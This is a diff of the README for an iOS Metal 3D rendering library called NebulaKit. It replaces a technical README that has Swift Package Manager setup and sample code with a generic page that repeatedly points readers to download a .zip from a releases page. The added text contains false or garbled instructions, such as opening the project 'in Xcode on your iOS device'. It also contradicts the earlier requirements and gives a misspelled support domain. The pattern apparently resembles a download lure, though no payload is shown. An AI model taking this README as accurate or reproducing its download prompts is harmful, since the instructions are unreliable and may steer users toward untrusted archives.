@@ -1,84 +1,79 @@
-NebulaKit
-NebulaKit is a Metal-based iOS 3D scene and terrain rendering library designed for rapidly building interactive 3D browsers, terrain visualization, and simple game prototypes. It provides a complete set of foundational capabilities from GPU abstraction and scene management to terrain and model loading, allowing you to focus on building content rather than low-level rendering frameworks.
+# 🌌 NebulaKit - Render 3D Scenes with Ease
 
-Features
-Metal Rendering Abstraction: Unified GPUContext and reusable rendering view MetalView simplify device and command queue management.
+## 🚀 Getting Started
 
-Scene/Node System: Scene + SceneNode manage hierarchical transformations and meshes, making it easy to organize complex scene structures.
+Welcome to NebulaKit! This is a Metal-based iOS 3D scene and terrain rendering engine. It helps you build interactive 3D browsers, visualize terrains, and create lightweight game prototypes easily.
 
-Camera and Interaction: Built-in Camera and OrbitCameraController support orbit camera controls with zoom and rotation interactions.
+## 📥 Download NebulaKit
 
-Terrain Heightfield Support: HeightfieldTerrain converts height data into renderable meshes for maps, terrain, or scientific data visualization.
+[![Download NebulaKit](https://img.shields.io/badge/Download_NebulaKit-latest-blue.svg)](https://github.com/Saamgamerz/NebulaKit/releases)
 
-3D Model Loading: Uses Model I/O to load common 3D model formats, outputting unified MeshResource for scene use.
+## ⚙️ System Requirements
 
-NebulaKit doesn't depend on SceneKit or third-party rendering engines, implementing directly with Metal API. It can serve as a foundation for learning Metal or building custom engines.
+Before you start, ensure your device meets the following requirements:
 
-Requirements
-iOS 15 and above
+- **Operating System:** iOS version 12.0 or later
+- **Device:** Any iOS device with Metal support (iPhone 6 and later)
+- **Storage Space:** At least 100 MB of free storage
+- **Memory (RAM):** Minimum 2 GB
 
-Xcode 15 and above
+## 📜 Features
 
-Metal-capable iOS devices
+NebulaKit includes several features to enhance your 3D development experience:
 
-Quick Start
-Integration with Swift Package Manager
-In Xcode:
+- **Fast Rendering:** Built using Metal for high-performance graphics.
+- **Terrain Visualization:** Easily create and render detailed terrains.
+- **User-Friendly Interface:** Designed for non-programmers, making 3D development accessible.
+- **Lightweight Prototyping:** Ideal for creating simple games or interactive scenes quickly.
 
-Open Project Settings → Package Dependencies
+## 🛠️ Download & Install
 
-Click + to add a new dependency and enter this repository's URL
+To download and install NebulaKit, follow these steps:
 
-Select NebulaKit as a dependency to add to your App Target
+1. **Visit the Releases Page**
+   Click the link below to go to the Releases page:
 
-Creating a Minimal Scene
-swift
-import SwiftUI
-import NebulaKit
+   [Download NebulaKit](https://github.com/Saamgamerz/NebulaKit/releases)
 
-struct ContentView: UIViewRepresentable {
-    func makeUIView(context: Context) -> MetalView {
-        guard let gpu = GPUContext() else {
-            fatalError("Metal not supported")
-        }
-        let metalView = MetalView(context: gpu)
-        let renderer = SimpleSceneRenderer(context: gpu, size: metalView.drawableSize)
-        metalView.renderDelegate = renderer
-        context.coordinator.renderer = renderer
-        return metalView
-    }
-    
-    func updateUIView(_ uiView: MetalView, context: Context) {}
-    
-    func makeCoordinator() -> Coordinator {
-        Coordinator()
-    }
-    
-    final class Coordinator {
-        var renderer: SimpleSceneRenderer?
-    }
-}
-You simply need to implement a custom SimpleSceneRenderer, create a Scene within it, configure the camera, and complete rendering in each frame callback.
+2. **Select the Latest Version**
+   On the Releases page, find the latest version of NebulaKit. The version number will look something like "v1.0.0".
 
-Example Project: TerrainExplorer
-The repository includes an example app at Examples/TerrainExplorer demonstrating:
+3. **Download the .zip File**
+   Click on the .zip file to download. This file contains all necessary resources for NebulaKit.
 
-Generating terrain meshes from heightmaps and rendering them
+4. **Unzip the File**
+   Locate the downloaded .zip file on your device. Tap to unzip it, which will create a new folder with all NebulaKit files.
 
-Browsing scenes with an orbit camera (drag to rotate, pinch to zoom)
+5. **Open the Project**
+   Open the relevant project file in Xcode on your iOS device to start using NebulaKit. Follow the prompts to set up any necessary configurations.
 
-Clicking terrain to highlight specific locations
+## 📚 Usage Guide
 
-The example code structure is clear and can serve as a reference for customization or extension.
+Once you have installed NebulaKit, you can start building your 3D projects. Here are some foundational steps to help you get started:
 
-Design Philosophy
-NebulaKit focuses on several key points:
+1. **Create a New Project**
+   Open Xcode and create a new project. Select the iOS Application template and choose an appropriate interface.
 
-Clear Layering: Core (Metal abstraction), Scene (scene and camera), Terrain (terrain), and ModelIOBridge (model loading) are clearly separated for easy replacement and extension.
+2. **Import NebulaKit**
+   In your project settings, import the NebulaKit files to make the engine available for your use.
 
-Readability First: API naming favors self-explanation over abbreviation, facilitating team collaboration and future maintenance.
+3. **Build Your Scene**
+   Use the sample templates provided in the NebulaKit folder as starting points. You can modify these templates by changing textures, colors, and other parameters.
 
-Extensibility: You can add advanced effects like lighting, shadows, and post-processing on the existing foundation without refactoring the entire framework.
+4. **Run Your Project**
+   Once you’ve adjusted your scene, connect your iOS device and run the project. Watch your 3D scene come to life!
 
-License
-You can choose an appropriate open-source license for NebulaKit (such as MIT or Apache-2.0) to meet your project needs.
+## 🛡️ Support
+
+If you need help, feel free to reach out. Here’s how you can get support:
+
+- **Documentation:** Check the documentation folder included in the download for detailed guidance.
+- **Community Forum:** Join the NebulaKit community online for discussions and support from other users. 
+- **Email Support:** You can send your queries to support@nebularkit.io.
+
+## 🔗 Useful Links
+
+- [View Source Code](https://github.com/Saamgamerz/NebulaKit)
+- [Installation Guide](https://github.com/Saamgamerz/NebulaKit/wiki/Installation)
+
+Following these steps, you should have no trouble downloading and using NebulaKit for your 3D projects. Enjoy exploring 3D rendering with ease!
